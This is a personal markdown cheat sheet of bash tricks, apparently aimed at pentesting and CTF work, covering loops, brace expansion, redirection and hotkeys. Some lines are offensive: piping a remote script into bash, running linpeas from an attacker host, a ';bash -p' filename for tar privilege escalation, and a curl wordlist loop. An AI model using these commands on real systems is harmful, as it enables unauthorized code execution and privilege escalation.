# bash isms
> bash default vars
```bash
echo $?      # gives error code of most recently run command
```


> for loop
```bash
for i in {0..100}; do  CMD; done
also works for command execs: 
for i in $(cat wordlist.txt); do curl http://IP/$i; done
```

> Brace expansion; similar to * operator on iteratbles in python
```bash
cat {file1,file2,file3} 	 	; will cat those file

useful for 
	mkdir dir{1..4} dirA{1..8}
	wget http://MY_IP/{file1,file2} 		; note could even do a loop style brace expansion of numbers or letters here

'other examples'
	{a..z}
	{1..-5}
```

> a note on mkdir; creating a path of dirs
```bash
mkdir -p dir1/dir2/dir3
```

> use ENV vars in your bash scripting by:
```bash
${ENV_VARIABLE} 		; perhaps un-exported?

similar to $my_var
```

> redirection
```sh
./BINARY < exploit.txt
	exploit.txt must contain 1 input per line

can wget a bash script and pipe it into bash to execute a hosted script
	wget http://IP/SCRIPT | bash

can run linpeas without touching disk
	bash <(curl http://attacker.com/LINPEAS)
```

> advanced redirection, i am calling this bidirection
```shell
while read -r line; echo "prefix-$line";done < wordlist > outfile
```
The above bidirection 


> file creation and "done with arguments"
```sh
When trying to create malicious filenames use:
	touch -- ';bash -p' 
E.g. when doing tar GTFO bins priv esc 
	alternate, echo into malicous filenames

```

> keystrokes and hotkeys
```sh
alt+.  # hotkey for use last argument
cd -   # cd to last working dir
ctrl+r # reverse search previous cmds
```




